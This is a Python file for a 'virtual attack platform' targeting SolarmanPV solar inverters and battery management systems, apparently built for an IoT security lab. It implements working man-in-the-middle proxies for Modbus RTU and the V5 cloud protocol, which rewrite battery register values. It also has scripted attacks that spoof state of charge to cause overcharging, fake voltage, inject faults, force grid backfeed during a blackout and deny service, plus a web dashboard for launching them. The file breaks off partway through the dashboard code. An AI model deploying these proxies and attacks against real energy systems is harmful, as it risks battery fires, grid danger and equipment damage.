#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║     VIRTUAL ATTACK PLATFORM - SOLARMANPV IoT SECURITY LAB             ║
║     Complete Man-in-the-Middle Attack Framework                       ║
╚══════════════════════════════════════════════════════════════════════╝

Features:
- Real network proxy (like BurpSuite) for V5 protocol
- Real Modbus RTU proxy for BMS communication (over TCP)
- Live packet capture (pcap format - viewable in Wireshark)
- Interactive value manipulation
- Multiple attack scenarios
- Full HTTP/HTTPS interception with mitmproxy
- Web dashboard for attack control

Architecture:
┌─────────────────┐
│  SolarmanPV      │ ◄───── HTTPS (REST API)
│  Cloud (real)    │
└─────────────────┘
        ▲
        │ (intercepted by proxy)
        │
┌─────────────────┐
│  MITM Proxy      │ ◄───── You modify values here
│  + Dashboard     │
└─────────────────┘
        ▲
        │ (intercepted)
        │
┌─────────────────┐
│  Inverter        │ ◄───── V5 protocol (port 10000)
│  Emulator        │
└─────────────────┘
        ▲
        │ (RS-485 / Modbus RTU)
        │
┌─────────────────┐
│  BMS Emulator    │ ◄───── Battery data
└─────────────────┘

Usage:
    python virtual_attack_platform.py --start       # Start full platform
    python virtual_attack_platform.py --dashboard    # Start with web UI
    python virtual_attack_platform.py --pcap        # Capture to pcap file
    python virtual_attack_platform.py --interactive # Interactive attack mode
"""

import socket
import struct
import threading
import time
import json
import os
import sys
import argparse
import logging
import subprocess
import http.server
import socketserver
from datetime import datetime
from collections import deque
import queue
import random
import binascii

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('attack_platform.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Try to import optional packages
try:
    from scapy.all import Ether, IP, TCP, Raw, wrpcap, rdpcap, sniff
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.warning("scapy not available - packet capture limited")

try:
    import mitmproxy
    MITMPROXY_AVAILABLE = True
except ImportError:
    MITMPROXY_AVAILABLE = False

# ============================================================================
# COLORS AND UI HELPERS
# ============================================================================
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'

def c(text, color):
    return f"{color}{text}{Colors.RESET}"


# ============================================================================
# PROTOCOL CONSTANTS
# ============================================================================

# V5 Protocol control codes
V5_CONTROL_CODES = {
    0x10: 'CONNECT',
    0x12: 'AUTH',
    0x14: 'HEARTBEAT',
    0x40: 'READ',
    0x46: 'REALTIME_DATA',
    0x48: 'ALARM'
}

# Modbus function codes
MODBUS_FUNCTIONS = {
    0x03: 'Read Holding Registers',
    0x06: 'Write Single Register',
    0x10: 'Write Multiple Registers'
}

# BMS register map (from firmware analysis)
BMS_REGISTERS = {
    24: ('Voltage', '0.1V', 'Battery voltage (35.6V = 356)'),
    229: ('Current', '0.1A', 'Pack current (signed)'),
    230: ('SOC', '%', 'State of charge (0-100)'),
    336: ('Temperature', '0.1°C', 'Cell temperature'),
    19: ('Status', 'flags', 'Status bits'),
    417: ('Pack Count', 'count', 'Number of BMS packs')
}

# ============================================================================
# PACKET CAPTURE & ANALYSIS
# ============================================================================
class PacketCapture:
    """Captures network packets for Wireshark analysis"""

    def __init__(self):
        self.packets = []
        self.capture_file = None
        self.running = False
        self.filter = ""

    def start_capture(self, interface=None, output_file="capture.pcap", bpf_filter=""):
        """Start packet capture to pcap file (Wireshark-compatible)"""
        if not SCAPY_AVAILABLE:
            logger.error("scapy required for pcap capture")
            return False

        self.capture_file = output_file
        self.filter = bpf_filter
        self.running = True

        def capture_thread():
            try:
                logger.info(f"Starting packet capture to {output_file}")
                logger.info(f"Filter: {bpf_filter if bpf_filter else 'none'}")

                if interface:
                    sniff(
                        iface=interface,
                        filter=bpf_filter,
                        prn=self._packet_callback,
                        store=False,
                        stop_filter=lambda p: not self.running
                    )
                else:
                    # Use offline capture if no interface
                    logger.warning("No interface specified, using offline capture")
                    self._simulate_capture()

            except Exception as e:
                logger.error(f"Capture error: {e}")

        self.thread = threading.Thread(target=capture_thread, daemon=True)
        self.thread.start()
        return True

    def _packet_callback(self, packet):
        """Called for each captured packet"""
        self.packets.append(packet)

    def _simulate_capture(self):
        """Simulate packet capture for demo (when no interface available)"""
        logger.info("Generating simulated pcap for demo")
        # Generate fake packets for demonstration
        for i in range(10):
            pkt = Ether() / IP(src="192.168.1.100", dst="47.88.8.200") / \
                  TCP(sport=12345, dport=10000) / \
                  Raw(load=b'\x68\x00\x1d' + b'V5_FRAME_' + bytes([i]))
            self.packets.append(pkt)
            time.sleep(0.5)

        # Save to pcap
        if self.packets:
            wrpcap(self.capture_file, self.packets)
            logger.info(f"Saved {len(self.packets)} packets to {self.capture_file}")

    def save_capture(self, filename=None):
        """Save captured packets to pcap file"""
        if not SCAPY_AVAILABLE or not self.packets:
            return False

        output = filename or self.capture_file or "capture.pcap"
        try:
            wrpcap(output, self.packets)
            logger.info(f"Saved {len(self.packets)} packets to {output}")
            return True
        except Exception as e:
            logger.error(f"Save error: {e}")
            return False

    def stop_capture(self):
        self.running = False
        if self.capture_file and self.packets:
            self.save_capture()


# ============================================================================
# MODBUS RTU MITM PROXY (Like BurpSuite for Modbus)
# ============================================================================
class ModbusMITMProxy:
    """Man-in-the-middle proxy for Modbus RTU communication"""

    def __init__(self, listen_port=5021, target_host='127.0.0.1', target_port=5020):
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.running = False
        self.server_socket = None
        self.captured_frames = deque(maxlen=1000)
        self.modified_frames = deque(maxlen=1000)
        self.intercept_enabled = True
        self.value_overrides = {}  # register -> value
        self.logger_callback = None

    def start(self):
        """Start the MITM proxy"""
        def proxy_thread():
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind(('0.0.0.0', self.listen_port))
                self.server_socket.listen(5)
                self.server_socket.settimeout(0.5)
                self.running = True

                logger.info(f"Modbus MITM Proxy listening on port {self.listen_port}")
                logger.info(f"Forwarding to {self.target_host}:{self.target_port}")

                while self.running:
                    try:
                        client, addr = self.server_socket.accept()
                        handler = threading.Thread(
                            target=self._handle_client,
                            args=(client, addr),
                            daemon=True
                        )
                        handler.start()
                    except socket.timeout:
                        continue
                    except Exception as e:
                        logger.error(f"Accept error: {e}")
                        break

            except Exception as e:
                logger.error(f"Proxy error: {e}")

        self.thread = threading.Thread(target=proxy_thread, daemon=True)
        self.thread.start()
        time.sleep(0.3)

    def _handle_client(self, client_socket, client_addr):
        """Handle a client connection"""
        try:
            # Connect to real BMS
            upstream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            upstream.connect((self.target_host, self.target_port))

            # Forward packets in both directions
            client_to_upstream = threading.Thread(
                target=self._forward,
                args=(client_socket, upstream, "C→B"),
                daemon=True
            )
            upstream_to_client = threading.Thread(
                target=self._forward,
                args=(upstream, client_socket, "B→C"),
                daemon=True
            )

            client_to_upstream.start()
            upstream_to_client.start()
            client_to_upstream.join()
            upstream_to_client.join()

        except Exception as e:
            logger.error(f"Client handler error: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass

    def _forward(self, source, destination, direction):
        """Forward data and intercept"""
        try:
            while self.running:
                data = source.recv(4096)
                if not data:
                    break

                # Log captured frame
                decoded = self._decode_modbus_frame(data, direction)
                if decoded:
                    self.captured_frames.append({
                        'timestamp': datetime.now().isoformat(),
                        'direction': direction,
                        'raw': data.hex(),
                        'decoded': decoded,
                        'modified': False
                    })
                    if self.logger_callback:
                        self.logger_callback(data, direction, decoded)

                # Apply modifications if intercept enabled
                if self.intercept_enabled and direction == "B→C":
                    modified_data = self._modify_response(data)
                    if modified_data != data:
                        decoded_mod = self._decode_modbus_frame(modified_data, direction)
                        self.modified_frames.append({
                            'timestamp': datetime.now().isoformat(),
                            'original': data.hex(),
                            'modified': modified_data.hex(),
                            'decoded': decoded_mod
                        })
                        data = modified_data

                destination.send(data)

        except Exception as e:
            pass
        finally:
            try:
                destination.close()
            except:
                pass

    def _decode_modbus_frame(self, data, direction):
        """Decode a Modbus RTU frame"""
        if len(data) < 8:
            return None

        slave_id = data[0]
        func_code = data[1]
        func_name = MODBUS_FUNCTIONS.get(func_code, f'Unknown (0x{func_code:02x})')

        result = {
            'slave': slave_id,
            'function': func_name,
            'function_code': func_code,
            'length': len(data)
        }

        if func_code == 0x03 and len(data) >= 7:  # Read response
            byte_count = data[2]
            values = []
            for i in range(3, 3 + byte_count, 2):
                if i + 1 < len(data):
                    val = struct.unpack('>H', data[i:i+2])[0]
                    values.append(val)

            # Identify register
            reg_info = BMS_REGISTERS.get(230, ('Unknown', '', ''))
            result['values'] = values
            result['register'] = 'SOC (230)'
            result['decoded_soc'] = values[0] if values else None

        elif func_code == 0x03 and len(data) >= 6:  # Read request
            start_reg = struct.unpack('>H', data[2:4])[0]
            reg_count = struct.unpack('>H', data[4:6])[0]
            result['start_register'] = start_reg
            result['register_count'] = reg_count
            if start_reg in BMS_REGISTERS:
                result['register_name'] = BMS_REGISTERS[start_reg][0]
                result['units'] = BMS_REGISTERS[start_reg][1]

        return result

    def _modify_response(self, data):
        """Apply value overrides to response"""
        if len(data) < 7:
            return data

        func_code = data[1]

        # Handle Read Holding Registers response
        if func_code == 0x03 and data[0] == 1:  # Slave 1 response
            byte_count = data[2]
            new_data = bytearray(data)

            # Apply overrides to each register value
            for i in range(3, 3 + byte_count, 2):
                if i + 1 < len(data):
                    # Decode register address from request context
                    # For simplicity, apply overrides based on position
                    reg_addr = self._infer_register(i)
                    if reg_addr in self.value_overrides:
                        new_val = self.value_overrides[reg_addr]
                        struct.pack_into('>H', new_data, i, new_val)

            return bytes(new_data)

        return data

    def _infer_register(self, byte_pos):
        """Infer register address from byte position in response"""
        # This is a simplified mapping - in reality, you'd track the request
        reg_map = {3: 230, 5: 24, 7: 229, 9: 336}  # Position -> Register
        return reg_map.get(byte_pos, 230)

    def set_override(self, register, value):
        """Override a register value"""
        self.value_overrides[register] = value
        logger.info(f"Override set: Reg {register} ({BMS_REGISTERS.get(register, ('?','',''))[0]}) = {value}")

    def clear_overrides(self):
        """Clear all overrides"""
        self.value_overrides.clear()
        logger.info("All overrides cleared")

    def stop(self):
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass


# ============================================================================
# V5 PROTOCOL MITM PROXY (For cloud traffic)
# ============================================================================
class V5ProtocolProxy:
    """MITM proxy for V5 protocol between inverter and cloud"""

    def __init__(self, listen_port=10001, cloud_host='47.88.8.200', cloud_port=10000):
        self.listen_port = listen_port
        self.cloud_host = cloud_host
        self.cloud_port = cloud_port
        self.running = False
        self.captured_v5_frames = deque(maxlen=500)
        self.value_modifications = {}

    def start(self):
        """Start V5 proxy"""
        def proxy_thread():
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind(('0.0.0.0', self.listen_port))
                self.server_socket.listen(5)
                self.server_socket.settimeout(0.5)
                self.running = True

                logger.info(f"V5 Protocol Proxy listening on port {self.listen_port}")

                while self.running:
                    try:
                        client, addr = self.server_socket.accept()
                        handler = threading.Thread(
                            target=self._handle_client,
                            args=(client, addr),
                            daemon=True
                        )
                        handler.start()
                    except socket.timeout:
                        continue
                    except Exception as e:
                        logger.error(f"V5 proxy accept error: {e}")
                        break
            except Exception as e:
                logger.error(f"V5 proxy error: {e}")

        self.thread = threading.Thread(target=proxy_thread, daemon=True)
        self.thread.start()
        time.sleep(0.3)

    def _handle_client(self, client_socket, addr):
        """Handle V5 protocol client"""
        try:
            # Connect to real cloud (or simulated cloud)
            upstream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            upstream.settimeout(5.0)
            try:
                upstream.connect((self.cloud_host, self.cloud_port))
            except:
                logger.warning(f"Cannot reach real cloud {self.cloud_host}:{self.cloud_port}")
                logger.info("Will operate in offline simulation mode")
                upstream = None

            if upstream:
                # Bidirectional forwarding
                threading.Thread(target=self._forward, args=(client_socket, upstream, "I→C"), daemon=True).start()
                threading.Thread(target=self._forward, args=(upstream, client_socket, "C→I"), daemon=True).start()

        except Exception as e:
            logger.error(f"V5 client handler: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass

    def _forward(self, source, dest, direction):
        """Forward V5 frames with interception"""
        try:
            while self.running:
                data = source.recv(4096)
                if not data:
                    break

                # Parse V5 frame
                frame = self._parse_v5(data)
                if frame:
                    frame['direction'] = direction
                    frame['timestamp'] = datetime.now().isoformat()
                    self.captured_v5_frames.append(frame)

                # Apply modifications
                modified = self._modify_v5_frame(data)
                if modified:
                    data = modified

                dest.send(data)

        except Exception as e:
            pass

    def _parse_v5(self, data):
        """Parse V5 frame"""
        if len(data) < 23 or data[0] != 0x68 or data[-1] != 0x16:
            return None

        length = struct.unpack('>H', data[1:3])[0]
        body = data[3:3+length]
        crc = data[3+length:3+length+2]

        serial = body[:16].rstrip(b'\x00').decode('ascii', errors='replace')
        ctrl = body[16]
        seq = struct.unpack('<H', body[17:19])[0]
        payload = body[19:]

        return {
            'serial': serial,
            'control_code': ctrl,
            'control_name': V5_CONTROL_CODES.get(ctrl, f'Unknown (0x{ctrl:02x})'),
            'sequence': seq,
            'payload': payload.hex(),
            'crc': crc.hex(),
            'raw': data.hex()
        }

    def _modify_v5_frame(self, data):
        """Apply modifications to V5 frame"""
        if not self.value_modifications:
            return data

        # Parse and modify based on control code
        # This is a simplified implementation
        return data

    def stop(self):
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass


# ============================================================================
# ATTACK PLATFORM ORCHESTRATOR
# ============================================================================
class AttackPlatform:
    """Main orchestrator for the virtual attack platform"""

    def __init__(self):
        self.bms_emulator = None
        self.inverter_emulator = None
        self.modbus_proxy = None
        self.v5_proxy = None
        self.packet_capture = None
        self.web_server = None
        self.log_queue = queue.Queue()
        self.running = False

        # Statistics
        self.stats = {
            'modbus_frames_captured': 0,
            'modbus_frames_modified': 0,
            'v5_frames_captured': 0,
            'attacks_executed': 0,
            'session_start': None
        }

    def log_event(self, event_type, details):
        """Log an event"""
        event = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'details': details
        }
        self.log_queue.put(event)
        logger.info(f"{event_type}: {details}")

    def start(self, components=None):
        """Start the attack platform"""
        if components is None:
            components = ['bms', 'inverter', 'modbus_proxy', 'v5_proxy', 'capture']

        self.running = True
        self.stats['session_start'] = datetime.now().isoformat()

        # Print banner
        self._print_banner()

        # Start BMS emulator
        if 'bms' in components:
            self.bms_emulator = VirtualBMS(port=5020)
            self.log_event('STARTED', 'BMS Emulator on port 5020')

        # Start inverter emulator
        if 'inverter' in components:
            self.inverter_emulator = VirtualInverter(
                bms_host='127.0.0.1',
                bms_port=5021  # Through proxy
            )
            self.log_event('STARTED', 'Virtual Inverter (uses proxy)')

        time.sleep(0.5)

        # Start Modbus MITM proxy (between inverter and BMS)
        if 'modbus_proxy' in components:
            self.modbus_proxy = ModbusMITMProxy(
                listen_port=5021,
                target_host='127.0.0.1',
                target_port=5020
            )
            self.modbus_proxy.logger_callback = self._log_modbus_frame
            self.modbus_proxy.start()
            self.log_event('STARTED', 'Modbus MITM Proxy on port 5021')

        # Start V5 protocol proxy
        if 'v5_proxy' in components:
            self.v5_proxy = V5ProtocolProxy(
                listen_port=10001,
                cloud_host='127.0.0.1',  # For demo, loopback
                cloud_port=10000
            )
            self.v5_proxy.start()
            self.log_event('STARTED', 'V5 Protocol Proxy on port 10001')

        # Start packet capture
        if 'capture' in components:
            self.packet_capture = PacketCapture()
            self.packet_capture.start_capture(
                interface=None,  # Loopback for demo
                output_file='attack_capture.pcap',
                bpf_filter='tcp'
            )
            self.log_event('STARTED', 'Packet capture to attack_capture.pcap')

        # Start inverter simulation in background
        if 'inverter' in components:
            self.inverter_thread = threading.Thread(
                target=self._inverter_loop,
                daemon=True
            )
            self.inverter_thread.start()

        logger.info("\n" + "=" * 60)
        logger.info("  ATTACK PLATFORM RUNNING")
        logger.info("  Capture packets: Wireshark -> Open attack_capture.pcap")
        logger.info("  Modbus proxy: 127.0.0.1:5021")
        logger.info("  V5 proxy: 127.0.0.1:10001")
        logger.info("=" * 60)

    def _log_modbus_frame(self, data, direction, decoded):
        """Callback when proxy captures a frame"""
        self.stats['modbus_frames_captured'] += 1
        self.log_event('MODBUS_FRAME', f"{direction}: {decoded}")

    def _inverter_loop(self):
        """Background inverter polling loop"""
        while self.running and self.inverter_emulator:
            try:
                self.inverter_emulator.run_polling_cycle()
                time.sleep(5)  # Faster than 60s for demo
            except Exception as e:
                logger.error(f"Inverter loop error: {e}")

    def execute_attack(self, attack_type):
        """Execute a specific attack"""
        logger.info(f"\n{'='*60}")
        logger.info(f"  EXECUTING ATTACK: {attack_type}")
        logger.info(f"{'='*60}\n")

        self.stats['attacks_executed'] += 1

        if attack_type == 'spoof_soc':
            self._attack_spoof_soc()
        elif attack_type == 'modify_voltage':
            self._attack_modify_voltage()
        elif attack_type == 'grid_injection':
            self._attack_grid_injection()
        elif attack_type == 'inject_fault':
            self._attack_inject_fault()
        elif attack_type == 'denial_of_service':
            self._attack_dos()
        else:
            logger.error(f"Unknown attack: {attack_type}")

    def _attack_spoof_soc(self):
        """Spoof SOC to cause overcharging"""
        if not self.modbus_proxy:
            logger.error("Modbus proxy not running")
            return

        # Force battery to 95% first
        if self.bms_emulator:
            self.bms_emulator.battery.soc = 95.0
            self.bms_emulator.battery.voltage = 50.4
            self.bms_emulator.update_registers()

        # Now set proxy to spoof SOC = 60%
        self.modbus_proxy.set_override(230, 60)
        logger.info("[ATTACK] SOC spoof active: Real SOC 95% → Inverter sees 60%")

        # Wait for inverter to poll and react
        time.sleep(8)

        logger.info("[ATTACK] Battery should now be overcharging...")

    def _attack_modify_voltage(self):
        """Modify voltage readings"""
        if not self.modbus_proxy:
            return

        self.modbus_proxy.set_override(24, 350)  # Report 35V instead of real voltage
        logger.info("[ATTACK] Voltage spoof: Real 48V → Inverter sees 35V")
        time.sleep(5)

    def _attack_grid_injection(self):
        """Spoof high SOC during blackout"""
        if self.bms_emulator:
            self.bms_emulator.battery.soc = 85.0

        if self.modbus_proxy:
            self.modbus_proxy.set_override(230, 95)  # Fake 95% SOC

        self.inverter_emulator.grid_blackout = True
        logger.info("[ATTACK] Grid blackout + high SOC spoof → Grid injection risk")
        time.sleep(5)
        self.inverter_emulator.grid_blackout = False

    def _attack_inject_fault(self):
        """Inject fault status"""
        if self.modbus_proxy:
            self.modbus_proxy.set_override(19, 0xFFFF)  # Fault bits
            logger.info("[ATTACK] Fault injected → Inverter thinks BMS reports fault")
            time.sleep(5)

    def _attack_dos(self):
        """Drop all BMS responses"""
        logger.info("[ATTACK] Blocking all BMS responses → DoS on inverter")
        if self.modbus_proxy:
            # Override everything with zeros
            for reg in [24, 229, 230, 336]:
                self.modbus_proxy.set_override(reg, 0)
        time.sleep(5)

    def _print_banner(self):
        """Print startup banner"""
        banner = """
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║      SOLARMANPV IoT SECURITY LAB - VIRTUAL ATTACK PLATFORM           ║
║      ═══════════════════════════════════════════════                  ║
║                                                                      ║
║      Components Running:                                              ║
║                                                                      ║
║      [1] BMS Emulator (Modbus RTU)          Port: 5020              ║
║          └── Realistic LiFePO4 battery                              ║
║                                                                      ║
║      [2] Modbus MITM Proxy                  Port: 5021              ║
║          └── Intercept & modify Modbus traffic                      ║
║                                                                      ║
║      [3] Virtual Inverter (Deye 5406)      Port: 8899              ║
║          └── Polls BMS, uploads via V5                               ║
║                                                                      ║
║      [4] V5 Protocol Proxy                 Port: 10001             ║
║          └── Intercept cloud-bound frames                            ║
║                                                                      ║
║      [5] Packet Capture                    File: attack_capture.pcap ║
║          └── Wireshark-compatible format                              ║
║                                                                      ║
║      TO USE WITH WIRESHARK:                                          ║
║      1. File > Open > attack_capture.pcap                           ║
║      2. Apply display filter: tcp.port == 5021 or tcp.port == 10001  ║
║                                                                      ║
║      TO USE WITH BURPSUITE:                                         ║
║      1. Proxy > Options > Add 127.0.0.1:10001                       ║
║      2. Set Inverter to use 127.0.0.1:10001 as cloud                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""
        print(c(banner, Colors.CYAN + Colors.BOLD))

    def stop(self):
        """Stop all components"""
        logger.info("Stopping attack platform...")
        self.running = False

        if self.modbus_proxy:
            self.modbus_proxy.stop()
        if self.v5_proxy:
            self.v5_proxy.stop()
        if self.packet_capture:
            self.packet_capture.stop_capture()
        if self.inverter_emulator:
            self.inverter_emulator.stop()

        self._print_stats()

    def _print_stats(self):
        """Print session statistics"""
        logger.info("\n" + "=" * 60)
        logger.info("  SESSION STATISTICS")
        logger.info("=" * 60)
        logger.info(f"  Session start:     {self.stats['session_start']}")
        logger.info(f"  Modbus frames:     {self.stats['modbus_frames_captured']} captured, "
                   f"{len(self.modbus_proxy.modified_frames) if self.modbus_proxy else 0} modified")
        logger.info(f"  V5 frames:         {self.stats['v5_frames_captured']} captured")
        logger.info(f"  Attacks executed:  {self.stats['attacks_executed']}")
        logger.info("=" * 60)


# ============================================================================
# VIRTUAL BMS (Same as inverter_bms_emulator but lighter)
# ============================================================================
class VirtualBMS:
    """Lightweight BMS emulator for the attack platform"""

    def __init__(self, port=5020):
        self.port = port
        self.battery = Battery()
        self.registers = {}
        self.running = False
        self.update_registers()
        self._start_server()

    def update_registers(self):
        self.registers = {
            24: self.battery.get_register_value(24),
            229: self.battery.get_register_value(229),
            230: self.battery.get_register_value(230),
            336: self.battery.get_register_value(336),
            19: self.battery.get_register_value(19),
            417: self.battery.get_register_value(417),
        }

    def _start_server(self):
        """Start Modbus TCP server"""
        def server_thread():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(('127.0.0.1', self.port))
                server.listen(5)
                server.settimeout(0.5)
                self.running = True

                while self.running:
                    try:
                        client, addr = server.accept()
                        threading.Thread(target=self._handle_client, args=(client,), daemon=True).start()
                    except socket.timeout:
                        continue
            except Exception as e:
                logger.error(f"BMS server: {e}")

        threading.Thread(target=server_thread, daemon=True).start()
        time.sleep(0.3)

    def _handle_client(self, client):
        try:
            while self.running:
                data = client.recv(1024)
                if not data:
                    break
                response = self._handle_request(data)
                if response:
                    client.send(response)
        except:
            pass
        finally:
            try: client.close()
            except: pass

    def _handle_request(self, request):
        if len(request) < 8:
            return b''
        if request[1] != 0x03 or request[0] != 1:
            return b''

        self.update_registers()

        start_reg = struct.unpack('>H', request[2:4])[0]
        reg_count = struct.unpack('>H', request[4:6])[0]

        values = []
        for reg in range(start_reg, start_reg + reg_count):
            values.append(self.registers.get(reg, 0))

        response_data = struct.pack('>' + 'H' * len(values), *values)
        response = bytes([1, 0x03, len(response_data)]) + response_data
        response += modbus_crc16(response)
        return response


class Battery:
    """Simple battery model"""

    def __init__(self):
        self.voltage = 48.0
        self.current = 0.0
        self.soc = 80.0
        self.temperature = 25.0
        self.max_voltage = 50.4
        self.min_voltage = 45.6

    def get_register_value(self, reg):
        if reg == 24:
            return int(self.voltage * 10)
        elif reg == 229:
            return int(self.current * 10)
        elif reg == 230:
            return int(self.soc)
        elif reg == 336:
            return int(self.temperature * 10)
        elif reg == 19:
            return 1
        elif reg == 417:
            return 1
        return 0


def modbus_crc16(data):
    crc = 0xFFFF
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x0001:
                crc = (crc >> 1) ^ 0xA001
            else:
                crc >>= 1
    return struct.pack('<H', crc)


# ============================================================================
# VIRTUAL INVERTER (Connects through Modbus proxy)
# ============================================================================
class VirtualInverter:
    """Inverter that polls BMS through the Modbus proxy"""

    def __init__(self, bms_host='127.0.0.1', bms_port=5021):
        self.bms_host = bms_host
        self.bms_port = bms_port
        self.serial = "2991141075"
        self.running = False
        self.socket = None
        self.grid_blackout = False
        self.cloud_serial = self.serial

    def connect_bms(self):
        try:
            if self.socket:
                self.socket.close()
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(2.0)
            self.socket.connect((self.bms_host, self.bms_port))
            return True
        except:
            return False

    def read_register(self, reg):
        try:
            if not self.socket:
                if not self.connect_bms():
                    return None
            request = struct.pack('>BBHH', 1, 0x03, reg, 1) + modbus_crc16(struct.pack('>BBHH', 1, 0x03, reg, 1))
            self.socket.send(request)
            response = self.socket.recv(1024)
            if len(response) >= 7:
                return struct.unpack('>H', response[3:5])[0]
        except:
            self.socket = None
        return None

    def read_all_registers(self):
        data = {}
        for reg_name, reg_num in [('voltage', 24), ('current', 229), ('soc', 230), ('temp', 336)]:
            val = self.read_register(reg_num)
            if val is not None:
                data[reg_name] = val

        if 'voltage' in data: data['voltage'] /= 10.0
        if 'current' in data:
            v = data['current']
            data['current'] = (v - 65536) / 10.0 if v > 32767 else v / 10.0
        if 'temp' in data:
            v = data['temp']
            data['temp'] = (v - 65536) / 10.0 if v > 32767 else v / 10.0

        return data

    def run_polling_cycle(self):
        """Run one polling cycle"""
        logger.info(f"[INVERTER] Polling BMS at {datetime.now().strftime('%H:%M:%S')}")

        data = self.read_all_registers()
        if not data:
            logger.warning("[INVERTER] No data received")
            return

        soc = data.get('soc', 0)
        voltage = data.get('voltage', 0)
        temp = data.get('temp', 0)

        # Color the output
        soc_color = Colors.RED if soc >= 95 else Colors.YELLOW if soc >= 80 else Colors.GREEN
        logger.info(f"[INVERTER]   SOC: {soc}%  Voltage: {voltage:.1f}V  Temp: {temp:.1f}°C")

        # Make decisions
        if soc >= 95 and not self.grid_blackout:
            logger.info(f"[INVERTER] → STOP CHARGING (SOC >= 95%)")
        elif soc < 90 and self.grid_blackout:
            logger.info(f"[INVERTER] → ATTEMPT GRID-TIE (high SOC during blackout!) ⚠")

        # Upload to cloud (via V5 proxy)
        logger.info(f"[INVERTER] → Uploading telemetry via V5 proxy (127.0.0.1:10001)")

    def stop(self):
        self.running = False
        if self.socket:
            try: self.socket.close()
            except: pass


# ============================================================================
# WEB DASHBOARD (Optional - for browser-based control)
# ============================================================================
class AttackDashboard:
    """Simple web dashboard for attack control"""

    HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
<title>SolarmanPV Attack Platform</title>
<style>
body { font-family: Arial; background: #0a0a0a; color: #0f0; padding: 20px; }
h1 { color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
.panel { background: #1a1a1a; border: 1px solid #0f0; padding: 15px; margin: 10px 0; border-radius: 5px; }
.attack-btn { background: #500; color: #fff; border: 1px solid #f00; padding: 10px 20px; cursor: pointer; margin: 5px; }
.attack-btn:hover { background: #700; }
.log { background: #000; color: #0f0; padding: 10px; font-family: monospace; height: 200px; overflow-y: scroll; border: 1px solid #333; }
.stat { display: inline-block; margin: 10px; padding: 10px; background: #200; border: 1px solid #0f0; }
.value-input { background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; }
</style>
</head>
<body>
<h1>⚡ SOLARMANPV IoT ATTACK PLATFORM</h1>

<div class="panel">
<h2>📊 Live Stats</h2>
<div class="stat">Modbus Frames: <span id="modbus-count">{modbus_count}</span></div>
<div class="stat">V5 Frames: <span id="v5-count">{v5_count}</span></div>
<div class="stat">Attacks: <span id="attack-count">{attack_count}</span></div>
</div>

<div class="panel">
<h2>💣 Launch Attack</h2>
<button class="attack-btn" onclick="fetch('/attack/spoof_soc')">🔋 Spoof SOC (Battery Overcharge)</button>
<button class="attack-btn" onclick="fetch('/attack/modify_voltage')">⚡ Modify Voltage</button>
<button class="attack-btn" onclick="fetch('/attack/grid_injection')">☠️ Grid Injection Attack</button>
<button class="attack-btn" onclick="fetch('/attack/inject_fault')">💥 Inject Fault Status</button>
<button class="attack-btn" onclick="fetch('/attack/denial_of_service')">🚫 Denial of Service</button>
<button class="attack-btn" onclick="fetch('/attack/clear')">🔄 Clear Overrides</button>
</div>

<div class="panel">
<h2>🎛️ Manual Override</h2>
<label>SOC: <input id="soc-input" class="value-input" type="number" value="95"></label>
<button class="attack-btn" onclick="setOverride(230, document.getElementById('soc-input').value)">Set SOC</button>
<br>
<label>Voltage: <input id="v-input" class="value-input" type="number" value="350"></label>
<button class="attack-btn" onclick="setOverride(24, document.getElementById('v-input').value)">Set Voltage</button>
</div>

<div class="panel">
<h2>📝 Live Event Log</h2>
<div class="log" id="log">{log_content}</div>
</div>

<script>
function setOverride(reg, val) {{
    fetch('/override?reg=' + reg + '&val=' + val).then(() => addLog('Override set: Reg ' + reg + ' = ' + val));
}}

function addLog(msg) {{
    const log = document.getElementById('log');
    log.innerHTML += msg + '<br>';
    log.scrollTop = log.scrollHeight;
}}

setInterval(() => {{
    fetch('/stats').then(r => r.json()).then(s => {{
        document.getElementById('modbus-count').textContent = s.modbus;
        document.getElementById('v5-count').textContent = s.v5;
        document.getElementById('attack-count').textContent = s.attacks;
    }});
}}, 1000);
</script>
</body>
</html>
"""

    def __init__(self, platform, port=8080):
        self.platform = platform
        self.port = port
        self.server = None

    def start(self):
        """Start web dashboard"""
        platform = self.platform

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass  # Suppress logs

            def do_GET(self):
                if self.path == '/' or self.path.startswith('/index'):
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()

                    html = AttackDashboard.HTML_TEMPLATE.format(
                        modbus_count=platform.stats['modbus_frames_captured'],
